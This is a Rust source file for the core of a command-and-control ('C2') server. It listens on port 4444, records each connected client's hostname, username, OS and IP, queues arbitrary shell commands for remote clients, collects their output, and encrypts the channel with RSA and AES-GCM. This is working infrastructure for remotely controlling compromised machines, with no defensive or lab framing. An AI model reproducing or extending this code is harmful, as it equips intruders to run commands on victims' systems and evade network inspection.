use anyhow::Result;
use base64::{engine::general_purpose, Engine as _};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;
use uuid::Uuid;
use chrono::{DateTime, Utc};
use rsa::{RsaPrivateKey, RsaPublicKey};

/// Configuration for the C2 server
#[derive(Debug, Clone)]
pub struct ServerConfig {
    pub bind_address: String,
    pub bind_port: u16,
    pub rsa_key_size: usize,
    pub heartbeat_timeout: u64, // seconds
    pub max_clients: usize,
}

impl Default for ServerConfig {
    fn default() -> Self {
        Self {
            bind_address: "0.0.0.0".to_string(),
            bind_port: 4444,
            rsa_key_size: 2048,
            heartbeat_timeout: 300, // 5 minutes
            max_clients: 100,
        }
    }
}

/// Client information stored on the server
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientInfo {
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub operating_system: String,
    pub ip_address: String,
    pub first_seen: DateTime<Utc>,
    pub last_seen: DateTime<Utc>,
    pub is_active: bool,
    pub session_key: Option<Vec<u8>>, // AES key for this client
}

/// Command to be executed on client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub id: String,
    pub command: String,
    pub timestamp: DateTime<Utc>,
    pub executed: bool,
}

/// Command result from client
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandResult {
    pub command_id: String,
    pub output: String,
    pub error: Option<String>,
    pub timestamp: DateTime<Utc>,
}

/// Message types for client-server communication
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "type")]
pub enum MessageType {
    // Initial handshake
    #[serde(rename = "handshake_request")]
    HandshakeRequest {
        client_info: ClientHandshakeInfo,
    },
    #[serde(rename = "handshake_response")]
    HandshakeResponse {
        public_key_pem: String,
        server_id: String,
    },
    #[serde(rename = "session_key")]
    SessionKey {
        encrypted_aes_key: String, // RSA encrypted AES key (base64)
    },
    #[serde(rename = "session_ack")]
    SessionAck {
        status: String,
    },
    
    // Regular communication (encrypted)
    #[serde(rename = "heartbeat")]
    Heartbeat {
        timestamp: DateTime<Utc>,
    },
    #[serde(rename = "heartbeat_ack")]
    HeartbeatAck {
        timestamp: DateTime<Utc>,
    },
    #[serde(rename = "command_request")]
    CommandRequest {},
    #[serde(rename = "command_response")]
    CommandResponse {
        command: Option<Command>,
    },
    #[serde(rename = "command_result")]
    CommandResult {
        result: CommandResult,
    },
    #[serde(rename = "command_ack")]
    CommandAck {
        command_id: String,
    },
}

/// Client information sent during handshake
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ClientHandshakeInfo {
    pub hostname: String,
    pub username: String,
    pub operating_system: String,
    pub client_version: String,
}

/// Encrypted message wrapper
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EncryptedMessage {
    pub encrypted_data: String, // base64 encoded encrypted JSON
    pub nonce: String,          // base64 encoded nonce
}

/// Server state shared across threads
pub type ServerState = Arc<RwLock<ServerStateInner>>;

#[derive(Debug)]
pub struct ServerStateInner {
    pub clients: HashMap<String, ClientInfo>,
    pub pending_commands: HashMap<String, Vec<Command>>, // client_id -> commands
    pub command_results: HashMap<String, Vec<CommandResult>>, // client_id -> results
    pub rsa_private_key: RsaPrivateKey,
    pub rsa_public_key: RsaPublicKey,
    pub config: ServerConfig,
}

impl ServerStateInner {
    pub fn new(config: ServerConfig) -> Result<Self> {
        use rsa::RsaPrivateKey;
        use rand::rngs::OsRng;
        
        let mut rng = OsRng;
        let private_key = RsaPrivateKey::new(&mut rng, config.rsa_key_size)?;
        let public_key = RsaPublicKey::from(&private_key);
        
        Ok(Self {
            clients: HashMap::new(),
            pending_commands: HashMap::new(),
            command_results: HashMap::new(),
            rsa_private_key: private_key,
            rsa_public_key: public_key,
            config,
        })
    }
    
    /// Add a new client or update existing client info
    pub fn add_or_update_client(&mut self, mut client_info: ClientInfo) {
        client_info.last_seen = Utc::now();
        client_info.is_active = true;
        
        if let Some(existing_client) = self.clients.get(&client_info.id) {
            // Preserve the first_seen time and session key
            client_info.first_seen = existing_client.first_seen;
            if client_info.session_key.is_none() {
                client_info.session_key = existing_client.session_key.clone();
            }
        } else {
            client_info.first_seen = Utc::now();
        }
        
        self.clients.insert(client_info.id.clone(), client_info);
    }
    
    /// Queue a command for a specific client
    pub fn queue_command(&mut self, client_id: &str, command: String) -> String {
        let command_id = Uuid::new_v4().to_string();
        let cmd = Command {
            id: command_id.clone(),
            command,
            timestamp: Utc::now(),
            executed: false,
        };
        
        self.pending_commands
            .entry(client_id.to_string())
            .or_insert_with(Vec::new)
            .push(cmd);
            
        command_id
    }
    
    /// Get next pending command for a client
    pub fn get_next_command(&mut self, client_id: &str) -> Option<Command> {
        if let Some(commands) = self.pending_commands.get_mut(client_id) {
            if !commands.is_empty() {
                let mut cmd = commands.remove(0);
                cmd.executed = true;
                return Some(cmd);
            }
        }
        None
    }
    
    /// Store command result
    pub fn store_command_result(&mut self, client_id: &str, result: CommandResult) {
        self.command_results
            .entry(client_id.to_string())
            .or_insert_with(Vec::new)
            .push(result);
    }
    
    /// Clean up inactive clients
    pub fn cleanup_inactive_clients(&mut self) {
        let timeout_duration = chrono::Duration::seconds(self.config.heartbeat_timeout as i64);
        let cutoff_time = Utc::now() - timeout_duration;
        
        let inactive_clients: Vec<String> = self.clients
            .iter()
            .filter(|(_, client)| client.last_seen < cutoff_time)
            .map(|(id, _)| id.clone())
            .collect();
            
        for client_id in inactive_clients {
            if let Some(mut client) = self.clients.get_mut(&client_id) {
                client.is_active = false;
            }
        }
    }
}

/// Utility functions for encryption/decryption
pub mod crypto {
    use super::*;
    use aes_gcm::{
        aead::{Aead, KeyInit, generic_array::GenericArray},
        Aes256Gcm, Nonce,
    };
    use rsa::{Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey};
    use rand::rngs::OsRng;
    
    /// Generate a random AES-256 key
    pub fn generate_aes_key() -> [u8; 32] {
        use rand::RngCore;
        let mut key = [0u8; 32];
        OsRng.fill_bytes(&mut key);
        key
    }
    
    /// Encrypt data with AES-256-GCM
    pub fn encrypt_aes(data: &[u8], key: &[u8; 32]) -> Result<EncryptedMessage> {
        let cipher = Aes256Gcm::new(GenericArray::from_slice(key));
        
        // Generate random nonce
        let mut nonce_bytes = [0u8; 12];
        use rand::RngCore;
        OsRng.fill_bytes(&mut nonce_bytes);
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let ciphertext = cipher.encrypt(nonce, data)
            .map_err(|e| anyhow::anyhow!("AES encryption failed: {}", e))?;
        
        Ok(EncryptedMessage {
            encrypted_data: general_purpose::STANDARD.encode(&ciphertext),
            nonce: general_purpose::STANDARD.encode(&nonce_bytes),
        })
    }
    
    /// Decrypt data with AES-256-GCM
    pub fn decrypt_aes(encrypted_msg: &EncryptedMessage, key: &[u8; 32]) -> Result<Vec<u8>> {
        let cipher = Aes256Gcm::new(GenericArray::from_slice(key));
        
        let ciphertext = general_purpose::STANDARD.decode(&encrypted_msg.encrypted_data)?;
        let nonce_bytes = general_purpose::STANDARD.decode(&encrypted_msg.nonce)?;
        let nonce = Nonce::from_slice(&nonce_bytes);
        
        let plaintext = cipher.decrypt(nonce, ciphertext.as_ref())
            .map_err(|e| anyhow::anyhow!("AES decryption failed: {}", e))?;
        
        Ok(plaintext)
    }
    
    /// Encrypt data with RSA public key
    pub fn encrypt_rsa(data: &[u8], public_key: &RsaPublicKey) -> Result<Vec<u8>> {
        let mut rng = OsRng;
        let encrypted = public_key.encrypt(&mut rng, Pkcs1v15Encrypt, data)
            .map_err(|e| anyhow::anyhow!("RSA encryption failed: {}", e))?;
        Ok(encrypted)
    }
    
    /// Decrypt data with RSA private key
    pub fn decrypt_rsa(ciphertext: &[u8], private_key: &RsaPrivateKey) -> Result<Vec<u8>> {
        let decrypted = private_key.decrypt(Pkcs1v15Encrypt, ciphertext)
            .map_err(|e| anyhow::anyhow!("RSA decryption failed: {}", e))?;
        Ok(decrypted)
    }
    
    /// Convert RSA public key to PEM format
    pub fn public_key_to_pem(public_key: &RsaPublicKey) -> Result<String> {
        use rsa::pkcs8::EncodePublicKey;
        let pem = public_key.to_public_key_pem(rsa::pkcs8::LineEnding::LF)
            .map_err(|e| anyhow::anyhow!("Failed to encode public key: {}", e))?;
        Ok(pem)
    }
}
